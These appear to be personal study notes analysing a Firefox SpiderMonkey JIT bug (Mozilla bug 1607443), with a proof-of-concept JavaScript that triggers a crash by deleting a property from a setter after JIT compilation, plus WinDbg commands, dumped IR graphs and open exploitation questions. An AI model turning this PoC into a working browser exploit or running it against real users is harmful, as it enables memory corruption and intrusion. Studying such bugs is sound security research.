# Resources

https://bug1607443.bmoattachments.org/attachment.cgi?id=9119101

"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" js.exe -f exploit.js -i

bp js!js::math_atan2

# Understanding the bug

```
let arr1 = [];
let arr2 = [1.1, 2.2, , 4.4];

//when arr2 property is set, it will delete arr1.x property. This property is then referenced causing a crash
arr2.__defineSetter__("-1", function(x) {
    delete arr1.x;
});

{
	//index JITTED with 5, b is jumping between True and False
    function f(b, index) {
        let ai = {};
        let aT = {};
        arr1.x = ai;
        if (b)
            arr1.x = aT;
        arr2[index] = 1.1;
		
		//vulnerable part, x is deleted when arr2[-1] is set
        arr1.x.x4 = 0;
    }
	
    delete arr1.x;
    for (let i = 0; i < 0x1000; i++) {
		//increase length of arr2, what is this for?
        arr2.length = 4;
		
		//jit with 50% false and true
        f((i & 1) === 1, 5);
    }
    f(true, -1);
}
```

## Dumping the graphs

//Parameter 1 is b
9 unbox parameter1 to Boolean (infallible) Bool	

//Parameter 2 is index
10 unbox parameter2 to Int32 (infallible) Int32

11 constant magic uninitialized-lexical MagicUninitializedLexical

//let ai = {};
12 constant object 889bec83200 (Object) Object
13 newobject constant12:Object Object

//let aT = {};
14 constant object 889bec83220 (Object) Object
15 newobject constant14:Object Object

//16-22: arr1.x = ai;
//16-18: arr1.x is loaded
16 constant object 889bec81040 (LexicalEnvironment) Object
17 slots constant16:Object Slots
18 loadslot slots17:Slots 0 Object
19 guardshape loadslot18:Object Object
//writes arr1.x with ai
20 postwritebarrier guardshape19:Object newobject13:Object
21 slots guardshape19:Object Slots
22 storeslot slots21 0 newobject13

// if (b)
23 test unbox9:Bool block2 block1

// if true
// arr1.x = aT
25 constant object 889bec81040 (LexicalEnvironment) Object
26 slots constant25:Object Slots
27 loadslot slots26:Slots 0 Object
28 guardshape loadslot27:Object Object
29 postwritebarrier guardshape28:Object newobject15:Object
30 slots guardshape28:Object Slots
31 storeslot slots30 0 newobject15

//33-39: arr2[index] = 1.1
33 constant object 889bec81040 (LexicalEnvironment) Object //loads arr2
34 slots constant33:Object Slots
35 loadslot slots34:Slots 1 Object

36 constant 1.1 Double	//value set = 1.1

37 tonumberint32 unbox10:Int32 Int32	//index 
38 elements loadslot35:Object Elements

//StoreElementHole(object, objectElement, index, value)
39 storeelementhole loadslot35:Object elements38:Elements tonumberint3237:Int32 constant36:Double

//40-48: arr1.x.x4 = 0
//Initialize arr1.x.x4
40 constant object 889bec81040 (LexicalEnvironment) Object
41 slots constant40:Object Slots
42 loadslot slots41:Slots 0 Object
43 guardshape loadslot42:Object Object
44 slots guardshape43:Object Slots
45 loadslot slots44:Slots 0 Object

46 constant 0x0 Int32

//arr1.x 
47 constant string 889bec12d40 String

//arr1.x.x4 = 0
48 setpropertycache loadslot45:Object constant47:String constant46:Int32


# Questions

1) Why do we require this line (arr2.length = 4)?
	- What happens to the memory of array when we do this? 

After every iteration, arr2.length becomes 5 because we set arr2[5] = 1.1.
Arr2 length need to be reduced back to 4.
This arr2.length is to facilitate the arr2[5].

2) Before SetPropertyCache is called, there is a guardshape.

In order for this exploit to work, GuardShape needs to be elimininated in the GVN phase.
In order for this exploit to work, arr1.x.x4 must not be dependent on arr2[index] instruction in the Alias Analysis phase.

We see that the guardshape is actually depending on the same node (start6). 
There is high chance that they will be removed in the GVN phase.

[AliasSummaries] Dependency list for other passes:
[AliasSummaries]  slots17 marked depending on start6
[AliasSummaries]  loadslot18 marked depending on start6
[AliasSummaries]  guardshape19 marked depending on start6
[AliasSummaries]  slots21 marked depending on start6
[AliasSummaries]  slots26 marked depending on start6
[AliasSummaries]  loadslot27 marked depending on start6
[AliasSummaries]  guardshape28 marked depending on start6
[AliasSummaries]  slots30 marked depending on start6
[AliasSummaries]  slots34 marked depending on start6
[AliasSummaries]  loadslot35 marked depending on start6
[AliasSummaries]  elements38 marked depending on start6
[AliasSummaries]  slots41 marked depending on start6
[AliasSummaries]  loadslot42 marked depending on start6
[AliasSummaries]  guardshape43 marked depending on start6

And indeed in the GVN Phase:

35 loadslot slots17:Slots 1 Object
36 constant 1.1 Double
38 elements loadslot35:Object Elements
39 storeelementhole loadslot35:Object elements38:Elements unbox10:Int32 constant36:Double
45 loadslot slots21:Slots 0 Object
46 constant 0x0 Int32
47 constant string 1fce46712d40 String
48 setpropertycache loadslot45:Object constant47:String constant46:Int32

3) So how do we exploit this?

From the POC, we look like we have an arbitrary write at arr1.x.x4. We can write any value.
** Lets just verify this, whether we can write any value **

What we are missing is, we need to know where the write is happening.

To do that, we need to analyse how properties are like in an array.

The exploitation method above isnt possible because I was unable to reclaim the memory spot in arr1.x. 

4) Why do we need to delete arr1.x before we jit?

000021d1`79f021e0 0000124a9937dd00 
000021d1`79f021e8 0000124a993987e8 
000021d1`79f021f0 0000000000000000 
000021d1`79f021f8 000021d179f02210 
000021d1`79f02200 0000000000000000 
000021d1`79f02208 0000000000000006 







